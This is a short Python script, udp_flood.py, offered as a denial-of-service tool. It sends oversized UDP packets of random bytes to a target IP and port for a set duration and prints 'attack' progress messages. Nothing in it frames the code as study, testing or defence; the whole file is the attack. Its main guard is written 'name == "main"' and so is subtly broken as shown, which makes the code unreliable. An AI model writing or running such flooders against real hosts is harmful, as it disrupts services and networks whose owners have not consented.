import socket
import random
import time
import sys

def udp_flood(target_ip, target_port, duration, multiply):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    start_time = time.time()
    packet_count = 0
    try:
        while time.time() - start_time < duration:
            data = random._urandom(8192*multiply)
            sock.sendto(data, (target_ip, target_port))
            packet_count += 1
            print(f"Packets sent: {packet_count}", end="\r")

    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        sock.close()
        print(f"\nTotal packets sent: {packet_count}")
        print("Attack finished.")

if name == "main":
    if len(sys.argv) != 5:
        print("Usage: python udp_flood.py <target_ip> <target_port> <duration_in_seconds> <multiply 1-7>")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    multiply = int(sys.argv[4])
    print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds...")
    udp_flood(target_ip, target_port, duration, multiply)